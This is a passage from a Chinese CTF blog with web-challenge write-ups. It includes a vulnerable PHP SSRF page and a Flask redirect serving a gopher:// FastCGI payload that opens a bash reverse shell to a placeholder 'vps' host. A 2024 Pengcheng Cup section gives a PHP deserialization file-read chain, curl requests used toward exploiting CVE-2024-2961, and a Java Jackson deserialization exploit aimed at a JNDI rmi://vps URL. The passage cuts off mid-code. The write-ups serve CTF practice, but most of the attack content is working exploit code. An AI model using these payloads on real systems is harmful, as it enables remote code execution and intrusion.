class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;logged_in&#x27;</span>] !== <span class="hljs-literal">true</span> || <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>] !== <span class="hljs-string">&#x27;admin&#x27;</span>) &#123;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;error&#x27;</span>] = <span class="hljs-string">&#x27;Please fill in the username and password&#x27;</span>;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: index.php&quot;</span>);<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<br><br><span class="hljs-variable">$url</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$error_message</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$page_content</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$url</span>)) &#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^https:\/\//&#x27;</span>, <span class="hljs-variable">$url</span>)) &#123;<br>        <span class="hljs-variable">$error_message</span> = <span class="hljs-string">&#x27;Invalid URL, only https allowed&#x27;</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>();<br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);<br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="hljs-number">1</span>);<br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>); <br>        <span class="hljs-variable">$page_content</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$page_content</span> === <span class="hljs-literal">false</span>) &#123;<br>            <span class="hljs-variable">$error_message</span> = <span class="hljs-string">&#x27;Failed to fetch the URL content&#x27;</span>;<br>        &#125;<br>        <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>&lt;!DOCTYPE html&gt;<br>&lt;html lang=<span class="hljs-string">&#x27;en&#x27;</span>&gt;<br>&lt;head&gt;<br>    &lt;meta charset=<span class="hljs-string">&#x27;UTF-8&#x27;</span>&gt;<br>    &lt;meta name=<span class="hljs-string">&#x27;viewport&#x27;</span> content=<span class="hljs-string">&#x27;width=device-width, initial-scale=1.0&#x27;</span>&gt;<br>    &lt;title&gt;Welcome&lt;/title&gt;<br>    &lt;style&gt;<br>        body &#123;<br>            margin: <span class="hljs-number">0</span>;<br>            display: flex;<br>            justify-content: center;<br>            align-items: center;<br>            height: <span class="hljs-number">100</span>vh;<br>            background: linear-<span class="hljs-title function_ invoke__">gradient</span>(<span class="hljs-number">135</span>deg, #<span class="hljs-number">6</span>dd5ed, #<span class="hljs-number">2193</span>b0);<br>            font-family: Arial, sans-serif;<br>            overflow: hidden;<br>            position: relative;<br>        &#125;<br><br>        body::<span class="hljs-variable constant_">before</span>, body::<span class="hljs-variable constant_">after</span> &#123;<br>            content: <span class="hljs-string">&#x27;&#x27;</span>;<br>            position: absolute;<br>            width: <span class="hljs-number">400</span>px;<br>            height: <span class="hljs-number">400</span>px;<br>            border-radius: <span class="hljs-number">50</span>%;<br>            background: <span class="hljs-title function_ invoke__">rgba</span>(<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">0.1</span>);<br>            animation: <span class="hljs-keyword">float</span> <span class="hljs-number">6</span>s ease-in-out infinite;<br>            z-index: <span class="hljs-number">0</span>;<br>        &#125;<br><br>        body::<span class="hljs-variable constant_">before</span> &#123;<br>            top: -<span class="hljs-number">100</span>px;<br>            right: -<span class="hljs-number">150</span>px;<br>        &#125;<br><br>        body::<span class="hljs-variable constant_">after</span> &#123;<br>            bottom: -<span class="hljs-number">150</span>px;<br>            left: -<span class="hljs-number">100</span>px;<br>        &#125;<br><br>        @keyframes <span class="hljs-keyword">float</span> &#123;<br>            <span class="hljs-number">0</span>%, <span class="hljs-number">100</span>% &#123; transform: <span class="hljs-title function_ invoke__">translateY</span>(<span class="hljs-number">0</span>); &#125;<br>            <span class="hljs-number">50</span>% &#123; transform: <span class="hljs-title function_ invoke__">translateY</span>(<span class="hljs-number">20</span>px); &#125;<br>        &#125;<br><br>        .login-container &#123;<br>            position: relative;<br>            z-index: <span class="hljs-number">1</span>;<br>            width: <span class="hljs-number">350</span>px;<br>            padding: <span class="hljs-number">2</span>rem;<br>            background-color: <span class="hljs-comment">#ffffff;</span><br>            border-radius: <span class="hljs-number">12</span>px;<br>            text-align: center;<br>            box-shadow: <span class="hljs-number">0</span>px <span class="hljs-number">4</span>px <span class="hljs-number">20</span>px <span class="hljs-title function_ invoke__">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0.2</span>);<br>            backdrop-filter: <span class="hljs-title function_ invoke__">blur</span>(<span class="hljs-number">10</span>px);<br>            transition: transform <span class="hljs-number">0.3</span>s ease;<br>        &#125;<br><br>        .login-container:hover &#123;<br>            transform: <span class="hljs-title function_ invoke__">translateY</span>(-<span class="hljs-number">5</span>px);<br>        &#125;<br><br>        .login-container h2 &#123;<br>            margin-bottom: <span class="hljs-number">1.5</span>rem;<br>            color: <span class="hljs-comment">#333;</span><br>            font-weight: bold;<br>        &#125;<br><br>        .login-container input[type=<span class="hljs-string">&#x27;text&#x27;</span>] &#123;<br>            width: <span class="hljs-number">100</span>%;<br>            padding: <span class="hljs-number">0.75</span>rem;<br>            margin: <span class="hljs-number">0.5</span>rem <span class="hljs-number">0</span>;<br>            border: <span class="hljs-number">1</span>px solid <span class="hljs-comment">#ddd;</span><br>            border-radius: <span class="hljs-number">5</span>px;<br>            box-sizing: border-box;<br>            font-size: <span class="hljs-number">1</span>rem;<br>            outline: none;<br>            transition: border-color <span class="hljs-number">0.3</span>s ease;<br>        &#125;<br><br>        .login-container input[type=<span class="hljs-string">&#x27;text&#x27;</span>]:focus &#123;<br>            border-color: <span class="hljs-comment">#4CAF50;</span><br>            box-shadow: <span class="hljs-number">0</span>px <span class="hljs-number">0</span>px <span class="hljs-number">5</span>px <span class="hljs-title function_ invoke__">rgba</span>(<span class="hljs-number">76</span>, <span class="hljs-number">175</span>, <span class="hljs-number">80</span>, <span class="hljs-number">0.5</span>);<br>        &#125;<br><br>        .login-container button &#123;<br>            width: <span class="hljs-number">100</span>%;<br>            padding: <span class="hljs-number">0.75</span>rem;<br>            margin-top: <span class="hljs-number">1</span>rem;<br>            background-color: <span class="hljs-comment">#4CAF50;</span><br>            color: white;<br>            border: none;<br>            border-radius: <span class="hljs-number">5</span>px;<br>            font-size: <span class="hljs-number">1</span>rem;<br>            cursor: pointer;<br>            transition: background-color <span class="hljs-number">0.3</span>s, transform <span class="hljs-number">0.3</span>s;<br>            position: relative;<br>            overflow: hidden;<br>        &#125;<br><br>        .login-container button:hover &#123;<br>            background-color: <span class="hljs-comment">#45a049;</span><br>            transform: <span class="hljs-title function_ invoke__">translateY</span>(-<span class="hljs-number">3</span>px);<br>        &#125;<br><br>        .login-container button:active &#123;<br>            transform: <span class="hljs-title function_ invoke__">translateY</span>(<span class="hljs-number">1</span>px);<br>        &#125;<br><br>        .login-container p &#123;<br>            margin-top: <span class="hljs-number">1</span>rem;<br>            color: <span class="hljs-comment">#666;</span><br>            font-size: <span class="hljs-number">0.9</span>rem;<br>        &#125;<br><br>        .error &#123;<br>            color: red;<br>            margin-top: <span class="hljs-number">0.5</span>rem;<br>            text-align: center;<br>            font-size: <span class="hljs-number">0.9</span>rem;<br>        &#125;<br><br>        .content &#123;<br>            margin-top: <span class="hljs-number">1</span>rem;<br>            padding: <span class="hljs-number">1</span>rem;<br>            background-color: <span class="hljs-comment">#f9f9f9;</span><br>            border: <span class="hljs-number">1</span>px solid <span class="hljs-comment">#ddd;</span><br>            border-radius: <span class="hljs-number">5</span>px;<br>            word-wrap: <span class="hljs-keyword">break</span>-word;<br>            max-height: <span class="hljs-number">200</span>px;<br>            overflow-y: auto;<br>        &#125;<br>    &lt;/style&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br><br>&lt;div <span class="hljs-class"><span class="hljs-keyword">class</span>=&#x27;<span class="hljs-title">login</span>-<span class="hljs-title">container</span>&#x27;&gt;</span><br><span class="hljs-class">    &lt;<span class="hljs-title">h2</span>&gt;<span class="hljs-title">Welcome</span>&lt;/<span class="hljs-title">h2</span>&gt;</span><br><span class="hljs-class">    &lt;<span class="hljs-title">p</span>&gt;ç½é¡µæ¥çï¼<span class="hljs-title">just</span> <span class="hljs-title">do</span> <span class="hljs-title">it</span>ð&lt;/<span class="hljs-title">p</span>&gt;</span><br><span class="hljs-class">    &lt;<span class="hljs-title">form</span> <span class="hljs-title">method</span>=&#x27;<span class="hljs-title">post</span>&#x27; <span class="hljs-title">action</span>=&#x27;&#x27;&gt;</span><br><span class="hljs-class">        &lt;<span class="hljs-title">input</span> <span class="hljs-title">type</span>=&#x27;<span class="hljs-title">text</span>&#x27; <span class="hljs-title">name</span>=&#x27;<span class="hljs-title">url</span>&#x27; <span class="hljs-title">placeholder</span>=&#x27;<span class="hljs-title">Enter</span> <span class="hljs-title">URL</span>&#x27; <span class="hljs-title">required</span>&gt;</span><br><span class="hljs-class">        &lt;<span class="hljs-title">button</span> <span class="hljs-title">type</span>=&#x27;<span class="hljs-title">submit</span>&#x27;&gt;<span class="hljs-title">Submit</span>&lt;/<span class="hljs-title">button</span>&gt;</span><br><span class="hljs-class">        &lt;?<span class="hljs-title">php</span> <span class="hljs-title">if</span> (!<span class="hljs-title">empty</span>($<span class="hljs-title">error_message</span>)) : ?&gt;</span><br><span class="hljs-class">            &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&#x27;<span class="hljs-title">error</span>&#x27;&gt;&lt;?= <span class="hljs-title">htmlspecialchars</span>($<span class="hljs-title">error_message</span>) ?&gt;&lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">        &lt;?<span class="hljs-title">php</span> <span class="hljs-title">endif</span>; ?&gt;</span><br><span class="hljs-class">    &lt;/<span class="hljs-title">form</span>&gt;</span><br><span class="hljs-class">    &lt;?<span class="hljs-title">php</span> <span class="hljs-title">if</span> (!<span class="hljs-title">empty</span>($<span class="hljs-title">page_content</span>)) : ?&gt;</span><br><span class="hljs-class">        &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&#x27;<span class="hljs-title">content</span>&#x27;&gt;</span><br><span class="hljs-class">            &lt;?= <span class="hljs-title">nl2br</span>(<span class="hljs-title">htmlspecialchars</span>($<span class="hljs-title">page_content</span>)); ?&gt;</span><br><span class="hljs-class">        &lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">    &lt;?<span class="hljs-title">php</span> <span class="hljs-title">endif</span>; ?&gt;</span><br><span class="hljs-class">&lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">&lt;/<span class="hljs-title">body</span>&gt;</span><br><span class="hljs-class">&lt;/<span class="hljs-title">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>发现能打302的SSRF，然而不知道密码账号，登录页面有个StoredAccounts.php，读一下拿到admin的账密了，登入。</p><p>但是我自己的域名起flask跳转打fastcgi打不进去，靶机不出网，也不知道出题人咋想的，就让人用filter-chain非预期呗。。。</p><p>官方给的用gopherus造个payload打fastcgi-SSRF反弹shell:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, redirect<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">indexRedirect</span>():<br>redirectUrl = <span class="hljs-string">&#x27;gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%05%05%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH106%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/admin.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00j%04%00%3C%3Fphp%20system%28%27bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/vps/port%200%3E%261%22%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00&#x27;</span><br><span class="hljs-keyword">return</span> redirect(redirectUrl)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>app.run(<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">8080</span>, debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><p>详情和其他题多解可看：</p><p><a href="https://z3r4y.blog.csdn.net/article/details/144333686?spm=1001.2014.3001.5502">【Web】2024“国城杯”网络安全挑战大赛题解-CSDN博客</a></p><p>剩下那道反序列化打session和phar，不打算做了，也没心情复现。</p><p>准备期末了。下播一阵子。</p>]]></content>
    
    
    
    <tags>
      
      <tag>比赛</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2024鹏城杯-web</title>
    <link href="/2024/11/13/2024%E9%B9%8F%E5%9F%8E%E6%9D%AF-web/"/>
    <url>/2024/11/13/2024%E9%B9%8F%E5%9F%8E%E6%9D%AF-web/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>复健了。web包ak的。</p><p>评价为弱智题。</p><h2 id="fileread"><a href="#fileread" class="headerlink" title="fileread"></a>fileread</h2><p>反序列化任意文件读，能找到根目录有readflag但是无回显，需要RCE。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">cls1</span></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$cls</span>;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$arr</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">cls2</span></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;hello.php&#x27;</span>;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$txt</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>&#125;<br><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">cls1</span>();<br><span class="hljs-variable">$a</span>-&gt;cls=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">cls2</span>();<br><span class="hljs-comment">// // $a-&gt;cls-&gt;filename=&#x27;/proc/1/cmdline&#x27;;</span><br><span class="hljs-comment">// $a-&gt;cls-&gt;filename=&#x27;/tmp/run.sh&#x27;;</span><br><span class="hljs-variable">$a</span>-&gt;cls-&gt;filename=<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>;<br><span class="hljs-variable">$a</span>-&gt;arr=[<span class="hljs-string">&#x27;fileput&#x27;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br></code></pre></td></tr></table></figure><p>版本为php8,想到打CVE-2024-2961:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl <span class="hljs-string">&quot;http://192.168.18.24/?ser=Tzo0OiJjbHMxIjoyOntzOjM6ImNscyI7Tzo0OiJjbHMyIjoyOntzOjg6ImZpbGVuYW1lIjtzOjE1OiIvcHJvYy9zZWxmL21hcHMiO3M6MzoidHh0IjtzOjA6IiI7fXM6MzoiYXJyIjthOjE6e2k6MDtzOjc6ImZpbGVwdXQiO319&quot;</span> -o maps<br><br>curl <span class="hljs-string">&quot;http://192.168.18.24/?ser=Tzo0OiJjbHMxIjoyOntzOjM6ImNscyI7Tzo0OiJjbHMyIjoyOntzOjg6ImZpbGVuYW1lIjtzOjg0OiJwaHA6Ly9maWx0ZXIvcmVhZD1jb252ZXJ0LmJhc2U2NC1lbmNvZGUvcmVzb3VyY2U9L3Vzci9saWIveDg2XzY0LWxpbnV4LWdudS9saWJjLnNvLjYiO3M6MzoidHh0IjtzOjA6IiI7fXM6MzoiYXJyIjthOjE6e2k6MDtzOjc6ImZpbGVwdXQiO319&quot;</span> -o ./1.txt<br></code></pre></td></tr></table></figure><p>由于有前缀需要删除，所以base64转一下libc.so，然后手动删除再转回来：</p><p><img src="/2024/11/13/2024%E9%B9%8F%E5%9F%8E%E6%9D%AF-web/image-20241109111401184.png" alt="image-20241109111401184"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-comment"># Read the base64 encoded content from the file</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;lic.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    base64_content = file.read()<br><br><span class="hljs-comment"># Decode the base64 content to binary</span><br>binary_content = base64.b64decode(base64_content)<br><br><span class="hljs-comment"># Write the binary content to the output file</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;lic.so&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    file.write(binary_content)<br></code></pre></td></tr></table></figure><p>然后就是用iconv脚本打，再传参payload，已经可以RCE了：</p><p><img src="/2024/11/13/2024%E9%B9%8F%E5%9F%8E%E6%9D%AF-web/c526ece5b759f7c91dca42c22d32f144.png" alt="img"></p><p>蚁剑连接，读readflag：</p><p><img src="/2024/11/13/2024%E9%B9%8F%E5%9F%8E%E6%9D%AF-web/f02b1b974002e22cf8dcbbf9be691a79.png" alt="img"></p><h2 id="LookUP"><a href="#LookUP" class="headerlink" title="LookUP"></a>LookUP</h2><p>二次反序列化用Jackson链打JNDI：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> com.backdoor.classes.hello;<br><span class="hljs-keyword">import</span> com.backdoor.classes.look;<br><span class="hljs-keyword">import</span> com.backdoor.util.MyInputstream;<br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtMethod;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.security.*;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashSet;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exp</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchAlgorithmException, IOException, SignatureException, InvalidKeyException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchFieldException &#123;<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.backdoor.classes.hello&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(<span class="hljs-string">&quot;name&quot;</span>);<br>        f.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> clazz.getDeclaredConstructor();<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> constructor.newInstance();<br>        f.set(o,<span class="hljs-string">&quot;rmi://vps:1099/akmaoy&quot;</span>);<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>            <span class="hljs-type">CtClass</span> <span class="hljs-variable">jsonNode</span> <span class="hljs-operator">=</span> pool.get(<span class="hljs-string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);<br>            <span class="hljs-type">CtMethod</span> <span class="hljs-variable">writeReplace</span> <span class="hljs-operator">=</span> jsonNode.getDeclaredMethod(<span class="hljs-string">&quot;writeReplace&quot;</span>);<br>            jsonNode.removeMethod(writeReplace);<br>            <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">classLoader</span> <span class="hljs-operator">=</span> Thread.currentThread().getContextClassLoader();<br>            jsonNode.toClass(classLoader, (ProtectionDomain)<span class="hljs-literal">null</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception var11) &#123;<br>        &#125;;<br><br>        <span class="hljs-type">HashSet</span> <span class="hljs-variable">hashSet</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>();<br>        hashSet.add(o);<br><br>        <span class="hljs-type">KeyPairGenerator</span> <span class="hljs-variable">kpg</span> <span class="hljs-operator">=</span> KeyPairGenerator.getInstance(<span class="hljs-string">&quot;DSA&quot;</span>);<br>        kpg.initialize(<span class="hljs-number">1024</span>);<br>        <span class="hljs-type">KeyPair</span> <span class="hljs-variable">kp</span> <span class="hljs-operator">=</span> 